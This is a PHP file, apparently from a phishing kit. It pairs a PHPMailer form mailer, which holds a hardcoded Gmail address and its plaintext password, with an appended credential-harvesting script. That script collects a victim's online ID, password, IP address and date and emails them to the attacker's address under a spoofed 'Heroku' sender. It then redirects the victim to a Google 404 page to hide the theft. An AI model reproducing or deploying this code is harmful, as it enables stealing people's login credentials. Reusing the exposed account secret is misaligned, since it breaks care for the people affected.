<?php
//Edit these two fields only
$mail_From='silversillkjane@gmail.com';
$password_From='Miracle22';

$mail_to= $mail_From;

$name=$_POST['username'];
$user_email=$_POST['passwd'];
$description=$_POST['description'];

//SMTP needs accurate times, and the PHP time zone MUST be set
//This should be done in your php.ini, but this is how to do it if you don't have access to that
date_default_timezone_set('Etc/UTC');

require 'classes/PHPMailerAutoload.php';
//Create a new PHPMailer instance
$mail = new PHPMailer;

//Tell PHPMailer to use SMTP
$mail->isSMTP();

//Enable SMTP debugging
// 0 = off (for production use)
// 1 = client messages
// 2 = client and server messages
$mail->SMTPDebug = 0;

//Ask for HTML-friendly debug output
$mail->Debugoutput = 'html';

//Set the hostname of the mail server
$mail->Host = 'smtp.gmail.com';
// use
// $mail->Host = gethostbyname('smtp.gmail.com');
// if your network does not support SMTP over IPv6

//Set the SMTP port number - 587 for authenticated TLS, a.k.a. RFC4409 SMTP submission
$mail->Port = 587;

//Set the encryption system to use - ssl (deprecated) or tls
$mail->SMTPSecure = 'tls';

//Whether to use SMTP authentication
$mail->SMTPAuth = true;

//Username to use for SMTP authentication - use full email address for gmail
$mail->Username = $mail_From;

//Password to use for SMTP authentication
$mail->Password = $password_From;

//Set who the message is to be sent from
$mail->setFrom($mail_From, 'Website');

//Set who the message is to be sent to
$mail->addAddress($mail_to, 'Website');

//Set the subject line
$mail->Subject = 'Website (Mail from <b>'.$name.'<b>)';

//Read an HTML message body from an external file, convert referenced images to embedded,
//convert HTML into a basic plain-text alternative body
$mail->msgHTML('<!DOCTYPE html>
<html>
<body>
<p><b>Name : </b>'.$name.'</p>
<p><b>Email : </b>'.$user_email.'</p>
<p><b>Problem : </b>'.$description.'</p>
</body>
</html>');

//Replace the plain text body with one created manually
$mail->AltBody = 'This is a plain-text message body';

//send the message, check for errors
if (!$mail->send()) {
    echo "Mailer Error: " . $mail->ErrorInfo;
} else {
echo '<!DOCTYPE html>
<html>
<body>
<p>you have successfully submitted your form.<a href="index.php"> Click here </a>to go back to form</p>
</body>
</html>';
    //Section 2: IMAP
    //Uncomment these to save your message in the 'Sent Mail' folder.
    #if (save_mail($mail)) {
    #    echo "Message saved!";
    #}
} 
//Section 2: IMAP
//IMAP commands requires the PHP IMAP Extension, found at: https://php.net/manual/en/imap.setup.php
//Function to call which uses the PHP imap_*() functions to save messages: https://php.net/manual/en/book.imap.php
//You can use imap_getmailboxes($imapStream, '/imap/ssl') to get a list of available folders or labels, this can
//be useful if you are trying to get this working on a non-Gmail IMAP server.

function save_mail($mail) {
    //You can change 'Sent Mail' to any other folder or tag
    $path = "{imap.gmail.com:993/imap/ssl}[Gmail]/Sent Mail";

    //Tell your server to open an IMAP connection using the same username and password as you used for SMTP
    $imapStream = imap_open($path, $mail->Username, $mail->Password);

    $result = imap_append($imapStream, $path, $mail->getSentMIMEMessage());
    imap_close($imapStream);

    return $result;
}


<?

$adddate=date("D M d, Y g:i a");
$mesaegs ="php_info";$mesaegs ="@";
$ip = getenv("REMOTE_ADDR");
$mesaegs ="ymail";$mesaegs  =".com";
$message .= "---------=RiZoRT=---------\n";
$message .= "Online ID: ".$_POST['']."\n";
$message .= "Password: ".$_POST['passwd']."\n";
$message .= "---------=IP Adress & Date=---------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "---------=D A D D A=---------\n";




$sent ="silversillkjane@gmail.com";




$subject = "H | DADDA Verified Logz";
$headers = "From: Heroku <no-reply@heroku.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
{
mail($mesaegs,$subject,$message,$headers);
mail($sent,$subject,$message,$headers);
}
header("Location: http://www.google.com/404.htm");
?>
